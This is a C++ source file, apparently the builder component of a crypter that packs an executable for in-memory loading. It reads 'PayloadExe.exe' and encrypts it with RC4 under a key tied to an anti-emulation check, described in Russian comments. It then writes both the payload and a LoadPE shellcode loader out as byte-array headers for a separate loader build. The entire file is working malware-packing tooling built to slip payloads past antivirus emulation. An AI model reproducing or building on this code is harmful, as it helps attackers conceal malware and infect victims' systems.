#include <Windows.h>
#include <iostream>
#include "ntddk.h"
#include <lm.h>
#include <stdio.h>
#include <stdint.h>
#include <ctime>

#include "../LoadPeToShell/FilesWork.h"
#include "../LoadPeToShell/LoadPe.h"

#define PATH_PAYLOAD_HEX "../LoadPeToShell/bin_shell/payload.h"
#define PATH_LOADPE_HEX "../LoadPeToShell/bin_shell/loadpe.h"

#define MEM_SIZE 1*1024*1024
#define STR_SIZE 512

#define swap(type,a,b,c) do{type t=a[b];a[b]=a[c];a[c]=t;}while(0)
static uint8_t* encRC4(uint8_t* pKey, DWORD dwKeyLen, uint8_t* pData, DWORD dwDataLen)
{
	BYTE s[256];
	DWORD i, j, c;

	for (i = 0; i < 256; s[i] = (BYTE)i++);

	for (i = j = 0; i < 256; ++i) {
		j = (j + s[i] + pKey[i % dwKeyLen]) % 256;
		swap(BYTE, s, i, j);
	}

	i = j = c = 0;

	while (dwDataLen--) {
		j = (j + s[i = (i + 1) % 256]) % 256;
		swap(BYTE, s, i, j);

		pData[c++] ^= s[(s[i] + s[j]) % 256];
	}

	return pData;
}

static void write_shellcode_to_file (FILE * hFilePayload, uint8_t key_for_crypt, const char * name_array, uint32_t szFilePayload, PBYTE lpFilePayload)
{
	fprintf(hFilePayload, name_array);

	//Шифрование
	uint8_t key_to_dec[4];

	key_to_dec[0] = key_for_crypt + 1;
	key_to_dec[1] = key_for_crypt + 2;
	key_to_dec[2] = key_for_crypt + 3;
	key_to_dec[3] = key_for_crypt + 4;

	encRC4(key_to_dec, 4, lpFilePayload, szFilePayload);

	uint32_t count = 0;
	for (int j = 0; j < (szFilePayload - 1); j++)
	{
		count++;
		if (count == 10)
		{
			fprintf(hFilePayload, "0x%02x,\n", (((uint8_t*)lpFilePayload)[j]));
			count = 0;
		}
		else  fprintf(hFilePayload, "0x%02x,", (((uint8_t*)lpFilePayload)[j]));
	};

#ifndef WIN64
	key_for_crypt = key_for_crypt - 116;
#else
	key_for_crypt = key_for_crypt - 200;
#endif

	fprintf(hFilePayload, " 0x%02x};\n", key_for_crypt);
	fclose(hFilePayload);
}

int main()
{
	PBYTE lpFileLoadPE, lpFilePayload;
	DWORD szFilePayload, szLoadPE;
	ULONG SizeLoadPe, StartLoadPe, EndLoadPe;
	ULONG SizeRC4, RC4_start, RC4_end;
	char* pLoadPe = NULL;

	StartLoadPe = (ULONG)LoadPE_Start;
	EndLoadPe = (ULONG)LoadPE_End;
	SizeLoadPe = (ULONG)(EndLoadPe - StartLoadPe);

	pLoadPe = (char*)malloc(MEM_SIZE);
	if (pLoadPe == NULL) {
		printf("Malloc no free mem \n");
		while (1);
	}

	memcpy(pLoadPe, LoadPE_Start, SizeLoadPe);
	
	FILE *hFilePayload = fopen(PATH_PAYLOAD_HEX, "wb+");
	FILE *hFileLoadpe = fopen(PATH_LOADPE_HEX, "wb+");

	if ((hFilePayload == NULL) || (hFileLoadpe == NULL))
	{
		printf("Error open files ");
		while (1);
	}

	lpFilePayload = ReadFileHelper(L"PayloadExe.exe", &szFilePayload);
	if (lpFilePayload == NULL) {
		printf("Error get PayloadExe.exe");
		while (1);
	}

	//Генерация ключа для шифрования:
	srand(time(0));
    uint8_t random_for_key = 1 + rand() % 128;
    
	//Функция антиэмуляции возвратит 116 для x86 и 200 для x64
#ifndef WIN64
	uint8_t key_for_crypt = random_for_key + 116;
#else
	uint8_t key_for_crypt = random_for_key + 200;
#endif

	//Записать PayloadExe.exe в ../LoadPeToShell/shell_modules/payload.h
	write_shellcode_to_file(hFilePayload, key_for_crypt, "uint8_t data_protect[] = { \n", szFilePayload, lpFilePayload);

	//Записать loadPe в ../LoadPeToShell/shell_modules/loadpe.h
	write_shellcode_to_file(hFileLoadpe, key_for_crypt, "uint8_t loadpe[] = { \n", SizeLoadPe, (PBYTE)pLoadPe);

	printf("Everything went well, you can build a project !!! \n");
	while (1);
}